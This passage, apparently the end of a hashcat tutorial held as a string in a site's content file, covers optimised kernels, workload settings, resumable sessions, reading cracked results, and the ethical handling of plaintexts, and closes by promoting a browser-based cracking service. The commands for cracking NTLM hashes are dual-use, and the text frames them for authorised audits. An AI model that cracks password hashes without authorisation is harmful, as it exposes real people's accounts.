\`-O\` enables optimised kernels that are meaningfully faster but assume a maximum password length (usually 31 or fewer), so a very long passphrase can be silently skipped — know that trade before you rely on it. \`-w\` sets how aggressively hashcat drives the card; \`-w 3\` is a good default on a dedicated cracking box, lower if you need the machine to stay responsive. And always run \`hashcat -b\` once on new hardware so you know, in advance, whether a given attack against a given hash type will take minutes or years.

## Don't lose a long session

\`\`\`bash
hashcat -m 1000 -a 0 h.txt w.txt -r rules/best64.rule --session=audit1
hashcat --session=audit1 --restore     # resume after a stop or reboot
hashcat -m 1000 h.txt --show           # print already-cracked plaintexts from the potfile
\`\`\`

Named sessions let you stop and resume a multi-day run, and hashcat records every crack in a *potfile* so re-running the same hashes instantly shows what is already broken rather than redoing the work. \`--show\` reads that potfile — it is how you pull results out at the end.

## Using the results honestly

The output of a cracking session is a list of real people's real passwords, even in a sanctioned audit — it is some of the most sensitive data you will handle. Report the *findings* (how many fell, to what kind of attack, how fast, which policy gaps that reveals), store the plaintexts encrypted, and destroy them when the engagement closes. The point of the exercise is to fix weak passwords, not to keep a trophy list. And, as always: crack only hashes you own or are authorised in writing to test.

## Running hashcat without a GPU rig of your own

Serious cracking wants a real GPU, and building or renting one is the right move for heavy work. For an audit that does not justify the hardware — or to check a policy against a wordlist without provisioning a machine — CyberSec Pro runs hashcat from a browser: you supply the hashes and choose the mode, attack and rules on a form, see the command before it runs, and watch progress stream back. The job runs server-side in a dedicated container, and the hashes you upload are treated as the sensitive material they are — held for the job and never written to logs or backups.

Whichever way you run it, the thinking carries over: identify the hash, respect how fast (or slow) its algorithm is, spend your guesses on rules and shaped masks rather than blind brute force, and handle what you recover like the liability it is.
    `,
  },
};
